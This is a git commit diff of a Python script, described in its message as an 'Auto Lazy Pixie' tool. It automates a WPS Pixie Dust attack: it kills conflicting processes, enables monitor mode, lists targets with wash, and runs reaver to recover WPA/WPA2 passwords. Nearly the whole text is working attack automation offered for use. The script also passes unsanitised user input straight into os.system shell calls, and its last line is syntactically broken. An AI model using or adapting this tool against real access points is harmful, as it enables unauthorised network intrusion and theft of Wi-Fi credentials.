e4228ec96842a905dd0a4a8357c08f98b498397e
David Enos <bluedangerforyou@gmail.com>
2016-05-21 17:25:55 -0700

    WPS Pixie Attack auto tool
    Auto Reaver
    This script will automatically put your card into monitor mode. 
    Run script and type in your interface, example: wlan0
    It will open a wash command terminal window
    copy BSSID and channel  number and enter in script when prompted
    Reaver will run WPS pixie attack
    Record WPA/WPA2 password

--- pixie.py
+++ pixie.py
@@ -1,22 +1,30 @@
 import os
-
 os.system('clear')
 
-print """
+def collect():
+	os.system('clear')
+	print """
 Auto Lazy Pixie Attack
 Script to automate WPS Pixie attack
 Bluedangerforyou
-"""
-interface = raw_input("Enter interface -example: wlan0 >> ")
 
-print '...running kill check on interface...'
-os.system('airmon-ng check kill')
-print '...putting ' + interface + ' into monitor mode...'
-os.system('airmon-ng start ' + interface)
-print 'A new terminal is opening. Pick a WPS enabled AP'
-BSSID = raw_input("What is the BSSID?>> ")
-channel = raw_input("What channel is AP?>> ")
-os.system("xterm -hold -e 'wash -i " + interface + "mon' & ")
-print 'Running reaver attack...'
-os.system('reaver -i ' + interface + 'mon -b ' + BSSID + ' -c ' + channel + ' -vvv -k 1 -f')
+"""
+
+	interface = raw_input("Enter interface -example: wlan0 >> ")
+	washcommand = "\'wash " + "-i " + interface + "mon\' --full-screen"
+
+	print '...running kill check on interface...'
+	os.system('airmon-ng check kill')
+	print '...putting ' + interface + ' into monitor mode...'
+	os.system('airmon-ng start ' + interface)
+	os.system("gnome-terminal -e " + washcommand)
+	os.system('clear')
+	print 'A new terminal is opening. Pick a WPS enabled AP'
+	BSSID = raw_input("Paste the BSSID>> ")
+	channel = raw_input("What channel is AP?>> ")
+	print 'Running reaver attack...'
+	os.system('reaver -i ' + interface + 'mon -b ' + BSSID + ' -c ' + channel + ' -vvv -K 1 -f')
+	raw_input(Press enter to exit)
+collect()
+
 
